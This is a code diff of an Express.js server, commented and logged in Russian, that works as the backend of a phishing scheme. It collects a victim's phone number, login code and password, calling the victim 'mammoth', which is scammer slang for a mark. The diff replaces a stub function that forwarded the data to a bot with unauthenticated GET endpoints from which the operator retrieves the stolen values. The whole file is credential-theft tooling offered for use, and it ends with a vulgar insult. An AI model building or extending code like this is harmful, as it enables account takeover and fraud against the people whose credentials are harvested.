@@ -30,33 +30,12 @@ app.use(cors({
 var pn;
 var code;
 var pass;
-function sendToBot(data) {
-    return new Promise((resolve, reject) => {
-        // Ваш код для отправки данных боту
-        // Предположим, что здесь есть асинхронный код для отправки данных боту
-        setTimeout(() => {
-            // Здесь мы просто симулируем успешную отправку данных
-            console.log("Данные успешно отправлены боту:", data);
-            resolve();
-        }, 1000); // Поддержка задержки для имитации асинхронной отправки данных
-    });
-}
-
-app.post('/phone', async (req, res) => {
+app.post('/phone', (req, res) => {
     const phone_number = req.body.phone_number;
     if (typeof phone_number !== 'undefined') {
         pn = phone_number;
         console.log(`Номер телефона мамонта: ${phone_number}`);
         res.json({ message: `Номер телефона мамонта: ${phone_number}` });
-        if (!isNaN(pn)) {
-            try {
-                await sendToBot(pn);
-                pn = undefined;
-            } catch (error) {
-                console.error("Ошибка при отправке данных боту:", error);
-                pn = undefined;
-            }
-        }
         return;
     } else {
         console.log('Номер телефона мамонта неопределен.');
@@ -65,44 +44,46 @@ app.post('/phone', async (req, res) => {
     }
 });
 
-app.post('/authCode', async (req, res) => {
+app.get('/getPhone', (req, res) => {
+    if(pn){
+        res.send(`Номер телефона мамонта: ${pn}`);
+        return 0;
+    } else {
+        res.status(404).send('Номер телефона мамонта не найден.');
+        return 0;
+    }
+});
+
+app.post('/authCode', (req, res) => {
     const value = req.body.value;
     if (typeof value !== 'undefined') {
         code = value;
         console.log(`Код мамонта: ${value}`);
         res.json({ message: `Код мамонта: ${value}` });
-        if (!isNaN(code)) {
-            try {
-                await sendToBot(code);
-                code = undefined;
-            } catch (error) {
-                console.error("Ошибка при отправке данных боту:", error);
-                code = undefined;
-            }
-        }
-        return;
+        return 0;
     } else {
         console.log('Код мамонта неопределен.');
         res.status(400).json({ error: 'Код мамонта неопределен.' });
-        return;
+        return 0;
     }
 });
 
-app.post('/password', async (req, res) => {
+app.get('/getCode', (req, res) => {
+    if(code){
+        res.send(`Код мамонта:\n${code}`);
+        return 0;
+    } else {
+        res.status(404).send('Код мамонта не найден.');
+        return 0;
+    }
+});
+
+app.post('/password', (req, res) => {
     const password = req.body.passwordInput;
     if (typeof password !== 'undefined') {
         pass = password;
         console.log(`Пароль мамонта: ${password}`);
         res.json({ message: `Пароль мамонта: ${password}` });
-        if (!isNaN(pass)) {
-            try {
-                await sendToBot(pass);
-                pass = undefined;
-            } catch (error) {
-                console.error("Ошибка при отправке данных боту:", error);
-                pass = undefined;
-            }
-        }
         return;
     } else {
         console.log('Пароль мамонта неопределен.');
@@ -111,8 +92,15 @@ app.post('/password', async (req, res) => {
     }
 });
 
-// Аналогично для других маршрутов
-
+app.get('/getPassword', (req, res) => {
+    if(pass){
+        res.send(`Пароль мамонта: ${pass}`);
+        return;
+    } else {
+        res.status(404).send('Пароль мамонта не найден.');
+        return;
+    }
+});
 
 app.get('/', (req, res) => {
     res.send('Salam Alejkum, Denis Penis!');
